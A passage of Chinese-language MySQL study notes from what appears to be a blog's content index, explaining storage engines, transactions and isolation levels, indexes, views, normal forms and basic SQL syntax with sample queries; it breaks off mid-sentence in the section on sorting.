被用于存储表的内容（表空间是一个逻辑名称。表空间存储数据+索引。）\n提供一组用来记录事务性活动的日志文件\n用 COMMIT(提交)、SAVEPOINT 及ROLLBACK(回滚)支持事务处理\n提供全 ACID 兼容\n在 MySQL 服务器崩溃后提供自动恢复\n多版本（MVCC）和行级锁定\n支持外键及引用的完整性，包括级联删除和更新\n\n\nInnoDB最大的特点就是支持事务：以保证数据的安全。效率不是很高，并且也不能压缩，不能转换为只读，\n\n不能很好的节省存储空间。\n\n\n9.4MEMORY存储引擎\n使用 MEMORY 存储引擎的表，其数据存储在内存中，且行的长度固定，这两个特点使得 MEMORY 存储引擎非常快。\n\nMEMORY 存储引擎管理的表具有下列特征：\n\n在数据库目录内，每个表均以.frm 格式的文件表示。\n表数据及索引被存储在内存中。（目的就是快，查询快！）\n表级锁机制。\n不能包含 TEXT 或 BLOB 字段。\n\n\nMEMORY 存储引擎以前被称为HEAP 引擎。\n\nMEMORY引擎优点：查询效率是最高的。不需要和硬盘交互。\n\nMEMORY引擎缺点：不安全，关机之后数据消失。因为数据和索引都是在内存当中。\n\n\n10.事务\n一个事务其实就是一个完整的业务逻辑。是一个最小的工作单元。不可再分。\n\n什么是一个完整的业务逻辑？    假设转账，从A账户向B账户中转账10000.      将A账户的钱减去10000（update语句）      将B账户的钱加上10000（update语句）      这就是一个完整的业务逻辑。\n\n以上的操作是一个最小的工作单元，要么同时成功，要么同时失败，不可再分。这两个update语句要求必须同时成功或者同时失败，这样才能保证钱是正确的。\n\ninsert   delete   update  只有以上的三个语句和事务有关系，其它都没有关系。\n\n事务：就是批量的DML语句同时成功，或者同时失败！\n\n\n10.1InnoDB实现事务\nInnoDB存储引擎：提供一组用来记录事务性活动的日志文件\n\n在事务的执行过程中，每一条DML的操作都会记录到“事务性活动的日志文件”中。\n\n在事务的执行过程中，我们可以提交事务，也可以回滚事务。\n\n提交事务   commit; 语句\n\n清空事务性活动的日志文件，将数据全部彻底持久化到数据库表中。\n提交事务标志着，事务的结束。并且是一种全部成功的结束。\n\n\n回滚事务  rollback; 语句（回滚永远都是只能回滚到上一次的提交点！）\n\n将之前所有的DML操作全部撤销，并且清空事务性活动的日志文件\n回滚事务标志着，事务的结束。并且是一种全部失败的结束。\n\n\n将mysql的自动提交机制关闭掉   start transaction;\n\n\n事务回滚\n\tmysql&gt; select * from dept_bak;\n\t\tEmpty set (0.00 sec)\n\tmysql&gt; start transaction;\n\tQuery OK, 0 rows affected (0.00 sec)\n\n\tmysql&gt; insert into dept_bak values(10,&#39;abc&#39;, &#39;tj&#39;);\n\tQuery OK, 1 row affected (0.00 sec)\n\n\tmysql&gt; insert into dept_bak values(10,&#39;abc&#39;, &#39;tj&#39;);\n\tQuery OK, 1 row affected (0.00 sec)\n\n\tmysql&gt; select * from dept_bak;\n\t+--------+-------+------+\n\t| DEPTNO | DNAME | LOC  |\n\t+--------+-------+------+\n\t|     10 | abc   | tj   |\n\t|     10 | abc   | tj   |\n\t+--------+-------+------+\n\t2 rows in set (0.00 sec)\n\n\tmysql&gt; rollback;\n\tQuery OK, 0 rows affected (0.00 sec)\n\n\tmysql&gt; select * from dept_bak;\n\tEmpty set (0.00 sec)\n\n10.2事物的四个特性A：原子性        说明事务是最小的工作单元。不可再分。\nC：一致性    所有事务要求，在同一个事务当中，所有操作必须同时成功，或者同时失败，    以保证数据的一致性。\nI：隔离性    A事务和B事务之间具有一定的隔离。    教室A和教室B之间有一道墙，这道墙就是隔离性。    A事务在操作一张表的时候，另一个事务B也操作这张表会那样？？？\nD：持久性    事务最终结束的一个保障。事务提交，就相当于将没有保存到硬盘上的数据    保存到硬盘上！\n10.3事务的隔离性10.3.1事务和事务之间四个隔离级别读未提交：read uncommitted（最低的隔离级别）《没有提交就读到了》\n\n事务A可以读取到事务B未提交的数据。\n这种隔离级别存在的问题就是：脏读现象！(Dirty Read)我们称读到了脏数据。\n这种隔离级别一般都是理论上的，大多数的数据库隔离级别都是二档起步！\n\n读已提交：read committed《提交之后才能读到》\n\n事务A只能读取到事务B提交之后的数据。\n这种隔离级别解决了解决了脏读的现象。\n这种隔离级别不可重复读取数据。\n在事务开启之后，第一次读到的数据是3条，当前事务还没有结束，可能第二次再读取的时候，读到的数据是4条，3不等于4称为不可重复读取。\n\n\n这种隔离级别是比较真实的数据，每一次读到的数据是绝对的真实。\noracle数据库默认的隔离级别是：read committed\n\n可重复读：repeatable read《提交之后也读不到，永远读取的都是刚开启事务时的数据》\n\n事务A开启之后，不管是多久，每一次在事务A中读取到的数据都是一致的。即使事务B将数据已经修改，并且提交了，事务A读取到的数据还是没有发生改变，这就是可重复读。\n\n可重复读可能会出现幻影读。每一次读取到的数据都是幻象。不够真实！\n\n早晨9点开始开启了事务，只要事务不结束，到晚上9点，读到的数据还是那样！读到的是假象。不够绝对的真实。\n\nmysql中默认的事务隔离级别就是这个！！！！！！！！！！！\n\n\n序列化&#x2F;串行化：serializable（最高的隔离级别）\n\n这是最高隔离级别，效率最低。解决了所有的问题。\n这种隔离级别表示事务排队，不能并发！\nsynchronized，线程同步（事务同步）每一次读取到的数据都是最真实的，并且效率是最低的。\n\n10.3.2验证各种隔离级别\nmysql 5 查看隔离级别：SELECT @@tx_isolation\nmysql 8 查看隔离级别：select @@transaction_isolation;\n\n验证：read uncommited\nmysql&gt; set global transaction isolation level read uncommitted;\n事务A\t\t\t\t\t\t\t\t\t\t\t\t\t事务B\n--------------------------------------------------------------------------------\nuse bjpowernode;\n\t\t\t\t\t\t\t\t\t\t\t\t\tuse bjpowernode;\nstart transaction;\nselect * from t_user;\n\t\t\t\t\t\t\t\t\t\t\t\t\tstart transaction;\n\t\t\t\t\t\t\t\t\t\t\t\t\tinsert into t_user values(&#39;zhangsan&#39;);\nselect * from t_user;\n\n验证：read commited\nmysql&gt; set global transaction isolation level read committed;\n事务A\t\t\t\t\t\t\t\t\t\t\t\t\t事务B\n--------------------------------------------------------------------------------\nuse bjpowernode;\n\t\t\t\t\t\t\t\t\t\t\t\t\tuse bjpowernode;\nstart transaction;\n\t\t\t\t\t\t\t\t\t\t\t\t\tstart transaction;\nselect * from t_user;\n\t\t\t\t\t\t\t\t\t\t\t\t\tinsert into t_user values(&#39;zhangsan&#39;);\nselect * from t_user;\n\t\t\t\t\t\t\t\t\t\t\t\t\tcommit;\nselect * from t_user;\n\n验证：repeatable read\nmysql&gt; set global transaction isolation level repeatable read;\n事务A\t\t\t\t\t\t\t\t\t\t\t\t\t事务B\n--------------------------------------------------------------------------------\nuse bjpowernode;\n\t\t\t\t\t\t\t\t\t\t\t\t\tuse bjpowernode;\nstart transaction;\n\t\t\t\t\t\t\t\t\t\t\t\t\tstart transaction;\nselect * from t_user;\n\t\t\t\t\t\t\t\t\t\t\t\t\tinsert into t_user values(&#39;lisi&#39;);\n\t\t\t\t\t\t\t\t\t\t\t\t\tinsert into t_user values(&#39;wangwu&#39;);\n\t\t\t\t\t\t\t\t\t\t\t\t\tcommit;\nselect * from t_user;\n\n验证：serializable\nmysql&gt; set global transaction isolation level serializable;\n事务A\t\t\t\t\t\t\t\t\t\t\t\t\t事务B\n--------------------------------------------------------------------------------\nuse bjpowernode;\n\t\t\t\t\t\t\t\t\t\t\t\t\tuse bjpowernode;\nstart transaction;\n\t\t\t\t\t\t\t\t\t\t\t\t\tstart transaction;\nselect * from t_user;\ninsert into t_user values(&#39;abc&#39;);\n\n11.索引\n索引是在数据库表的字段上添加的，是为了提高查询效率存在的一种机制。\n\n一张表的一个字段可以添加一个索引，当然，多个字段联合起来也可以添加索引。\n\n索引相当于一本书的目录，是为了缩小扫描范围而存在的一种机制。\n\nMySQL在查询方面主要就是两种方式：全表扫描  ；根据索引检索。\n\n在mysql数据库当中索引也是需要排序的，并且这个所以的排序和TreeSet\n\n数据结构相同。TreeSet（TreeMap）底层是一个自平衡的二叉树！在mysql当中索引是一个B-Tree数据结构。\n\n遵循左小又大原则存放。采用中序遍历方式遍历取数据。\n\n\n索引的实现原理？\n\n\n提醒1：在任何数据库当中主键上都会自动添加索引对象，id字段上自动有索引，因为id是PK。另外在mysql当中，一个字段上如果有unique约束的话，也会自动创建索引对象\n提醒2：在任何数据库当中，任何一张表的任何一条记录在硬盘存储上都有一个硬盘的物理存储编号。\n提醒3：在mysql当中，索引是一个单独的对象，不同的存储引擎以不同的形式存在，在MyISAM存储引擎中，索引存储在一个.MYI文件中。在InnoDB存储引擎中索引存储在一个逻辑名称叫做tablespace的当中。在MEMORY存储引擎当中索引被存储在内存当中。不管索引存储在哪里，索引在mysql当中都是一个树的形式\n\n什么条件下，我们会考虑给字段添加索引呢？\n\n数据量庞大（到底有多么庞大算庞大，这个需要测试，因为每一个硬件环境不同）\n该字段经常出现在where的后面，以条件的形式存在，也就是说这个字段总是被扫描。\n该字段很少的DML(insert delete update)操作。（因为DML之后，索引需要重新排序。）\n\n\n建议不要随意添加索引，因为索引也是需要维护的，太多的话反而会降低系统的性能。\n建议通过主键查询，建议通过unique约束的字段进行查询，效率是比较高的。\n\n11.1索引的创建和删除创建索引：\n\tmysql&gt; create index emp_ename_index on emp(ename);\n\t给emp表的ename字段添加索引，起名：emp_ename_index\n删除索引：\n\tmysql&gt; drop index emp_ename_index on emp;\n\t将emp表上的emp_ename_index索引对象删除。\n\t\n\t\n\t查看一个SQL语句是否使用了索引进行检索？\n\tmysql&gt; explain select * from emp where ename &#x3D; &#39;KING&#39;;\n\t+----+-------------+-------+------+---------------+------+---------+--\n\t| id | select_type | table | type | possible_keys | key  | key_len | \n\t+----+-------------+-------+------+---------------+------+---------+-\n\t|  1 | SIMPLE      | emp   | ALL  | NULL          | NULL | NULL    | \n\t+----+-------------+-------+------+---------------+------+---------+--\n\t扫描14条记录：说明没有使用索引。type&#x3D;ALL\n\n\tmysql&gt; create index emp_ename_index on emp(ename);\n\n\tmysql&gt; explain select * from emp where ename &#x3D; &#39;KING&#39;;\n\t+----+-------------+-------+------+-----------------+-----------------\n\t| id | select_type | table | type | possible_keys   | key             \n\t+----+-------------+-------+------+-----------------+-----------------\n\t|  1 | SIMPLE      | emp   | ref  | emp_ename_index | emp_ename_index \n\t+----+-------------+-------+------+-----------------+-----------------\n\n11.2索引失效失效的第1种情况：\n\tselect * from emp where ename like &#39;%T&#39;;\n\tename上即使添加了索引，也不会走索引，为什么？\n\t\t原因是因为模糊匹配当中以“%”开头了！\n\t\t尽量避免模糊查询的时候以“%”开始。\n\t\t这是一种优化的手段&#x2F;策略。\n\tmyql&gt; explain select * from emp where ename like &#39;%T&#39;;\n\t+----+-------------+-------+------+---------------+------+---------+--\n\t| id | select_type | table | type | possible_keys | key  | key_len | \n\t+----+-------------+-------+------+---------------+------+---------+--\n\t|  1 | SIMPLE      | emp   | ALL  | NULL          | NULL | NULL    | \n\t+----+-------------+-------+------+---------------+------+---------+--\n\n失效的第2种情况：\n\t使用or的时候会失效，如果使用or那么要求or两边的条件字段都要有\n\t索引，才会走索引，如果其中一边有一个字段没有索引，那么另一个\n\t字段上的索引也会实现。所以这就是为什么不建议使用or的原因。\n\n\tmysql&gt; explain select * from emp where ename &#x3D; &#39;KING&#39; or job &#x3D; &#39;MANAGER&#39;;\n\t+----+-------------+-------+------+-----------------+------+---------\n\t| id | select_type | table | type | possible_keys   | key  | key_len | \n\t+----+-------------+-------+------+-----------------+------+---------\n\t|  1 | SIMPLE      | emp   | ALL  | emp_ename_index | NULL | NULL    | \n\t+----+-------------+-------+------+-----------------+------+---------\n\n失效的第3种情况：\n\t使用复合索引的时候，没有使用左侧的列查找，索引失效\n\t什么是复合索引？\n\t\t两个字段，或者更多的字段联合起来添加一个索引，叫做复合索引。\n\t\n\tcreate index emp_job_sal_index on emp(job,sal);\n\t\n\tmysql&gt; explain select * from emp where job &#x3D; &#39;MANAGER&#39;;\n\t+----+-------------+-------+------+-------------------+---------------\n\t| id | select_type | table | type | possible_keys     | key           \n\t+----+-------------+-------+------+-------------------+---------------\n\t|  1 | SIMPLE      | emp   | ref  | emp_job_sal_index | \n\t+----+-------------+-------+------+-------------------+---------------\n\t\n\tmysql&gt; explain select * from emp where sal &#x3D; 800;\n\t+----+-------------+-------+------+---------------+------+---------+--\n\t| id | select_type | table | type | possible_keys | key  | key_len | \n\t+----+-------------+-------+------+---------------+------+---------+--\n\t|  1 | SIMPLE      | emp   | ALL  | NULL          | NULL | NULL    | \n\t+----+-------------+-------+------+---------------+------+---------+--\n\n12.视图\n视图view:站在不同的角度去看待同一份数据。\n\n表复制：\n\tmysql&gt; create table dept2 as select * from dept;\ndept2表中的数据：\n\tmysql&gt; select * from dept2;\n+--------+------------+----------+\n| DEPTNO | DNAME      | LOC      |\n+--------+------------+----------+\n|     10 | ACCOUNTING | NEW YORK |\n|     20 | RESEARCH   | DALLAS   |\n|     30 | SALES      | CHICAGO  |\n|     40 | OPERATIONS | BOSTON   |\n+--------+------------+----------+\n\n创建视图对象：\n\tcreate view dept2_view as select * from dept2;\n\n删除视图对象：\n\tdrop view dept2_view;\n\n注意：只有DQL语句才能以view的形式创建。\n\tcreate view view_name as 这里的语句必须是DQL语句;\n\n12.1视图的作用\n我们可以面向视图对象进行增删改查，对视图对象的增删改查，会导致原表被操作！（视图的特点：通过对视图的操作，会影响到原表数据。）\n\n&#x2F;&#x2F;面向视图查询\nselect * from dept2_view; \n\n&#x2F;&#x2F; 面向视图插入\ninsert into dept2_view(deptno,dname,loc) values(60,&#39;SALES&#39;, &#39;BEIJING&#39;);\n\n&#x2F;&#x2F; 查询原表数据\nmysql&gt; select * from dept2;\n+--------+------------+----------+\n| DEPTNO | DNAME      | LOC      |\n+--------+------------+----------+\n|     10 | ACCOUNTING | NEW YORK |\n|     20 | RESEARCH   | DALLAS   |\n|     30 | SALES      | CHICAGO  |\n|     40 | OPERATIONS | BOSTON   |\n|     60 | SALES      | BEIJING  |\n+--------+------------+----------+\n\n&#x2F;&#x2F; 面向视图删除\nmysql&gt; delete from dept2_view;\n\n&#x2F;&#x2F; 查询原表数据\nmysql&gt; select * from dept2;\nEmpty set (0.00 sec)\n&#x2F;&#x2F; 创建视图对象\ncreate view \n\temp_dept_view\nas\n\tselect \n\t\te.ename,e.sal,d.dname\n\tfrom\n\t\temp e\n\tjoin\n\t\tdept d\n\ton\n\t\te.deptno &#x3D; d.deptno;\n\n&#x2F;&#x2F; 查询视图对象\nmysql&gt; select * from emp_dept_view;\n+--------+---------+------------+\n| ename  | sal     | dname      |\n+--------+---------+------------+\n| CLARK  | 2450.00 | ACCOUNTING |\n| KING   | 5000.00 | ACCOUNTING |\n| MILLER | 1300.00 | ACCOUNTING |\n| SMITH  |  800.00 | RESEARCH   |\n| JONES  | 2975.00 | RESEARCH   |\n| SCOTT  | 3000.00 | RESEARCH   |\n| ADAMS  | 1100.00 | RESEARCH   |\n| FORD   | 3000.00 | RESEARCH   |\n| ALLEN  | 1600.00 | SALES      |\n| WARD   | 1250.00 | SALES      |\n| MARTIN | 1250.00 | SALES      |\n| BLAKE  | 2850.00 | SALES      |\n| TURNER | 1500.00 | SALES      |\n| JAMES  |  950.00 | SALES      |\n+--------+---------+------------+\n\n&#x2F;&#x2F; 面向视图更新\nupdate emp_dept_view set sal &#x3D; 1000 where dname &#x3D; &#39;ACCOUNTING&#39;;\n\n&#x2F;&#x2F; 原表数据被更新\nmysql&gt; select * from emp;\n+-------+--------+-----------+------+------------+---------+---------+----\n| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | \n+-------+--------+-----------+------+------------+---------+---------+----\n|  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     \n|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     \n|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     \n|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     \n|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     \n|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     \n|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 1000.00 |    NULL |     \n|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     \n|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 1000.00 |    NULL |     \n|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     \n|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     \n|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     \n|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     \n|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1000.00 |    NULL |     \n+-------+--------+-----------+------+------------+---------+---------+----\n\n12.2视图在开发中的作用\n假设有一条非常复杂的SQL语句，而这条SQL语句需要在不同的位置上反复使用。每一次使用这个sql语句的时候都需要重新编写，很长，很麻烦，怎么办？    可以把这条复杂的SQL语句以视图对象的形式新建。    在需要编写这条SQL语句的位置直接使用视图对象，可以大大简化开发。    并且利于后期的维护，因为修改的时候也只需要修改一个位置就行，只需要    修改视图对象所映射的SQL语句。\n\n我们以后面向视图开发的时候，使用视图的时候可以像使用table一样。\n\n可以对视图进行增删改查等操作。*视图不是在内存当中，视图对象也是存储在硬盘上的，不会消失。*\n\n\n13.数据库三范式第一范式：要求任何一张表必须有主键，每一个字段原子性不可再分。\n第二范式：建立在第一范式的基础之上，要求所有非主键字段完全依赖主键，不要产生部分依赖。\n第三范式：建立在第二范式的基础之上，要求所有非主键字段直接依赖主键，不要产生传递依赖。\n\n声明：三范式是面试官经常问的，所以一定要熟记在心！\n\n设计数据库表的时候，按照以上的范式进行，可以避免表中数据的冗余，空间的浪费。\n13.1第一范式学生编号 学生姓名 联系方式\n\t------------------------------------------\n\t1001\t\t张三\t\tzs@gmail.com,1359999999\n\t1002\t\t李四\t\tls@gmail.com,13699999999\n\t1001\t\t王五\t\tww@163.net,13488888888\n\t\n以上是学生表，满足第一范式吗？\n\t不满足，第一：没有主键。第二：联系方式可以分为邮箱地址和电话\n\n学生编号(pk) 学生姓名\t邮箱地址\t\t\t联系电话\n----------------------------------------------------\n1001\t\t\t\t张三\t\tzs@gmail.com\t1359999999\n1002\t\t\t\t李四\t\tls@gmail.com\t13699999999\n1003\t\t\t\t王五\t\tww@163.net\t\t13488888888\n\n13.2第二范式\t学生编号 \t\t学生姓名 \t教师编号 教师姓名\n\t----------------------------------------------------\n\t1001\t\t\t张三\t\t001\t\t王老师\n\t1002\t\t\t李四\t\t002\t\t赵老师\n\t1003\t\t\t王五\t\t001\t\t王老师\n\t1001\t\t\t张三\t\t002\t\t赵老师\n这张表描述了学生和老师的关系：（1个学生可能有多个老师，1个老师有多个学生）\n这是非常典型的：多对多关系！\n\n分析以上的表是否满足第一范式？\n\t不满足第一范式。\n\n怎么满足第一范式呢？修改\n\n学生编号+教师编号(pk)\t\t学生姓名  教师姓名\n----------------------------------------------------\n1001\t\t\t001\t\t\t\t张三\t\t\t王老师\n1002\t\t\t002\t\t\t\t李四\t\t\t赵老师\n1003\t\t\t001\t\t\t\t王五\t\t\t王老师\n1001\t\t\t002\t\t\t\t张三\t\t\t赵老师\n\n学生编号 教师编号，两个字段联合做主键，复合主键（PK: 学生编号+教师编号）\n经过修改之后，以上的表满足了第一范式。但是满足第二范式吗？\n\t不满足，“张三”依赖1001，“王老师”依赖001，显然产生了部分依赖。\n\t产生部分依赖有什么缺点？\n\t\t数据冗余了。空间浪费了。“张三”重复了，“王老师”重复了。\n\n为了让以上的表满足第二范式，你需要这样设计：\n\t使用三张表来表示多对多的关系！！！！\n\t学生表\n\t学生编号(pk)\t\t学生名字\n\t------------------------------------\n\t1001\t\t\t\t\t张三\n\t1002\t\t\t\t\t李四\n\t1003\t\t\t\t\t王五\n\t\n\t教师表\n\t教师编号(pk)\t\t教师姓名\n\t--------------------------------------\n\t001\t\t\t\t\t王老师\n\t002\t\t\t\t\t赵老师\n\n\t学生教师关系表\n\tid(pk)\t\t\t学生编号(fk)\t\t\t教师编号(fk)\n\t------------------------------------------------------\n\t1\t\t\t\t\t\t1001\t\t\t\t\t\t001\n\t2\t\t\t\t\t\t1002\t\t\t\t\t\t002\n\t3\t\t\t\t\t\t1003\t\t\t\t\t\t001\n\t4\t\t\t\t\t\t1001\t\t\t\t\t\t002\n\n\n多对多，三张表，关系表两个外键！！！！！！！！！！！！！！！\n\n13.3第三范式​\t\n\t学生编号（PK） \t\t\t学生姓名  班级编号  \t班级名称\n---------------------------------------------------------\n\n​\t\t1001\t\t\t\t张三\t\t01\t\t\t一年一班\n​\t\t1002\t\t\t\t李四\t\t02\t\t\t一年二班\n​\t\t1003\t\t\t\t王五\t\t03\t\t\t一年三班\n​\t\t1004\t\t\t\t赵六\t\t03\t\t\t一年三班\n\n以上表的设计是描述：班级和学生的关系。很显然是1对多关系！\n一个教室中有多个学生。\n\n分析以上表是否满足第一范式？\n\t满足第一范式，有主键。\n\n分析以上表是否满足第二范式？\n\t满足第二范式，因为主键不是复合主键，没有产生部分依赖。主键是单一主键。\n\n分析以上表是否满足第三范式？\n\t第三范式要求：不要产生传递依赖！\n\t一年一班依赖01，01依赖1001，产生了传递依赖。\n\t不符合第三范式的要求。产生了数据的冗余。\n\n那么应该怎么设计一对多呢？\n\n\t班级表：一\n\t班级编号(pk)\t\t\t\t班级名称\n\t----------------------------------------\n\t01\t\t\t\t\t\t\t\t一年一班\n\t02\t\t\t\t\t\t\t\t一年二班\n\t03\t\t\t\t\t\t\t\t一年三班\n\n\t学生表：多\n\n\t学生编号（PK） 学生姓名 班级编号(fk)\n\t-------------------------------------------\n\t1001\t\t\t\t张三\t\t\t01\t\t\t\n\t1002\t\t\t\t李四\t\t\t02\t\t\t\n\t1003\t\t\t\t王五\t\t\t03\t\t\t\n\t1004\t\t\t\t赵六\t\t\t03\t\t\n\n\n一对多，两张表，多的表加外键！！！！！！！！！！！！\n\n关于三范式的实际使用\n数据库设计三范式是理论上的，实践和理论有的时候有偏差。\n最终的目的都是为了满足客户的需求，有的时候会拿冗余换执行速度。\n因为在sql当中，表和表之间连接次数越多，效率越低。（笛卡尔积）\n有的时候可能会存在冗余，但是为了减少表的连接次数，这样做也是合理的，并且对于开发人员来说，sql语句的编写难度也会降低。\n面试的时候把这句话说上：他就不会认为你是初级程序员了！\n\n\n\n\n\n\n\n\n\n在线笔记都是引用别人的笔记，保存下来方便自己学习，如有侵权请联系我删除\n原文：https://gitee.com/yueliu2345/mysql\n","slug":"MYSQL","date":"2023-01-10T13:21:22.691Z","categories_index":"在线笔记","tags_index":"数据库安全","author_index":"Abyssaler"},{"id":"ed24fbd407825b2a3a3f1a7f074c200e","title":"MYSQL在线笔记2","content":"基础篇通用语法及分类\nDDL: 数据定义语言，用来定义数据库对象（数据库、表、字段）\nDML: 数据操作语言，用来对数据库表中的数据进行增删改\nDQL: 数据查询语言，用来查询数据库中表的记录\nDCL: 数据控制语言，用来创建数据库用户、控制数据库的控制权限\n\nDDL（数据定义语言）数据定义语言\n数据库操作查询所有数据库：SHOW DATABASES;查询当前数据库：SELECT DATABASE();创建数据库：CREATE DATABASE [ IF NOT EXISTS ] 数据库名 [ DEFAULT CHARSET 字符集] [COLLATE 排序规则 ];删除数据库：DROP DATABASE [ IF EXISTS ] 数据库名;使用数据库：USE 数据库名;\n注意事项\nUTF8字符集长度为3字节，有些符号占4字节，所以推荐用utf8mb4字符集\n\n表操作查询当前数据库所有表：SHOW TABLES;查询表结构：DESC 表名;查询指定表的建表语句：SHOW CREATE TABLE 表名;\n创建表：\nCREATE TABLE 表名(\n\t字段1 字段1类型 [COMMENT 字段1注释],\n\t字段2 字段2类型 [COMMENT 字段2注释],\n\t字段3 字段3类型 [COMMENT 字段3注释],\n\t...\n\t字段n 字段n类型 [COMMENT 字段n注释]\n)[ COMMENT 表注释 ];\n最后一个字段后面没有逗号\n添加字段：ALTER TABLE 表名 ADD 字段名 类型(长度) [COMMENT 注释] [约束];例：ALTER TABLE emp ADD nickname varchar(20) COMMENT &#39;昵称&#39;;\n修改数据类型：ALTER TABLE 表名 MODIFY 字段名 新数据类型(长度);修改字段名和字段类型：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型(长度) [COMMENT 注释] [约束];例：将emp表的nickname字段修改为username，类型为varchar(30)ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT &#39;昵称&#39;;\n删除字段：ALTER TABLE 表名 DROP 字段名;\n修改表名：ALTER TABLE 表名 RENAME TO 新表名\n删除表：DROP TABLE [IF EXISTS] 表名;删除表，并重新创建该表：TRUNCATE TABLE 表名;\nDML（数据操作语言）添加数据指定字段：INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...);全部字段：INSERT INTO 表名 VALUES (值1, 值2, ...);\n批量添加数据：INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...);INSERT INTO 表名 VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...);\n注意事项\n字符串和日期类型数据应该包含在引号中\n插入的数据大小应该在字段的规定范围内\n\n更新和删除数据修改数据：UPDATE 表名 SET 字段名1 = 值1, 字段名2 = 值2, ... [ WHERE 条件 ];例：UPDATE emp SET name = &#39;Jack&#39; WHERE id = 1;\n删除数据：DELETE FROM 表名 [ WHERE 条件 ];\nDQL（数据查询语言）语法：\nSELECT\n\t字段列表\nFROM\n\t表名字段\nWHERE\n\t条件列表\nGROUP BY\n\t分组字段列表\nHAVING\n\t分组后的条件列表\nORDER BY\n\t排序字段列表\nLIMIT\n\t分页参数\n\n基础查询查询多个字段：SELECT 字段1, 字段2, 字段3, ... FROM 表名;SELECT * FROM 表名;\n设置别名：SELECT 字段1 [ AS 别名1 ], 字段2 [ AS 别名2 ], 字段3 [ AS 别名3 ], ... FROM 表名;SELECT 字段1 [ 别名1 ], 字段2 [ 别名2 ], 字段3 [ 别名3 ], ... FROM 表名;\n去除重复记录：SELECT DISTINCT 字段列表 FROM 表名;\n转义：SELECT * FROM 表名 WHERE name LIKE &#39;/_张三&#39; ESCAPE &#39;/&#39;&#x2F; 之后的_不作为通配符\n条件查询语法：SELECT 字段列表 FROM 表名 WHERE 条件列表;\n条件：\n\n\n\n比较运算符\n功能\n\n\n\n&gt;\n大于\n\n\n&gt;&#x3D;\n大于等于\n\n\n&lt;\n小于\n\n\n&lt;&#x3D;\n小于等于\n\n\n&#x3D;\n等于\n\n\n&lt;&gt; 或 !&#x3D;\n不等于\n\n\nBETWEEN … AND …\n在某个范围内（含最小、最大值）\n\n\nIN(…)\n在in之后的列表中的值，多选一\n\n\nLIKE 占位符\n模糊匹配（_匹配单个字符，%匹配任意个字符）\n\n\nIS NULL\n是NULL\n\n\n\n\n\n逻辑运算符\n功能\n\n\n\nAND 或 &amp;&amp;\n并且（多个条件同时成立）\n\n\nOR 或 &amp;#124;&amp;#124;\n或者（多个条件任意一个成立）\n\n\nNOT 或 !\n非，不是\n\n\n例子：\n-- 年龄等于30\nselect * from employee where age &#x3D; 30;\n-- 年龄小于30\nselect * from employee where age &lt; 30;\n-- 小于等于\nselect * from employee where age &lt;&#x3D; 30;\n-- 没有身份证\nselect * from employee where idcard is null or idcard &#x3D; &#39;&#39;;\n-- 有身份证\nselect * from employee where idcard;\nselect * from employee where idcard is not null;\n-- 不等于\nselect * from employee where age !&#x3D; 30;\n-- 年龄在20到30之间\nselect * from employee where age between 20 and 30;\nselect * from employee where age &gt;&#x3D; 20 and age &lt;&#x3D; 30;\n-- 下面语句不报错，但查不到任何信息\nselect * from employee where age between 30 and 20;\n-- 性别为女且年龄小于30\nselect * from employee where age &lt; 30 and gender &#x3D; &#39;女&#39;;\n-- 年龄等于25或30或35\nselect * from employee where age &#x3D; 25 or age &#x3D; 30 or age &#x3D; 35;\nselect * from employee where age in (25, 30, 35);\n-- 姓名为两个字\nselect * from employee where name like &#39;__&#39;;\n-- 身份证最后为X\nselect * from employee where idcard like &#39;%X&#39;;\n\n聚合查询（聚合函数）常见聚合函数：\n\n\n\n函数\n功能\n\n\n\ncount\n统计数量\n\n\nmax\n最大值\n\n\nmin\n最小值\n\n\navg\n平均值\n\n\nsum\n求和\n\n\n语法：SELECT 聚合函数(字段列表) FROM 表名;例：SELECT count(id) from employee where workaddress = &quot;广东省&quot;;\n分组查询语法：SELECT 字段列表 FROM 表名 [ WHERE 条件 ] GROUP BY 分组字段名 [ HAVING 分组后的过滤条件 ];\nwhere 和 having 的区别：\n\n执行时机不同：where是分组之前进行过滤，不满足where条件不参与分组；having是分组后对结果进行过滤。\n判断条件不同：where不能对聚合函数进行判断，而having可以。\n\n例子：\n-- 根据性别分组，统计男性和女性数量（只显示分组数量，不显示哪个是男哪个是女）\nselect count(*) from employee group by gender;\n-- 根据性别分组，统计男性和女性数量\nselect gender, count(*) from employee group by gender;\n-- 根据性别分组，统计男性和女性的平均年龄\nselect gender, avg(age) from employee group by gender;\n-- 年龄小于45，并根据工作地址分组\nselect workaddress, count(*) from employee where age &lt; 45 group by workaddress;\n-- 年龄小于45，并根据工作地址分组，获取员工数量大于等于3的工作地址\nselect workaddress, count(*) address_count from employee where age &lt; 45 group by workaddress having address_count &gt;&#x3D; 3;\n\n注意事项\n执行顺序：where &gt; 聚合函数 &gt; having\n分组之后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义\n\n排序查询语法：SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1, 字段2 排序方式2;\n排序方式：\n\nASC: 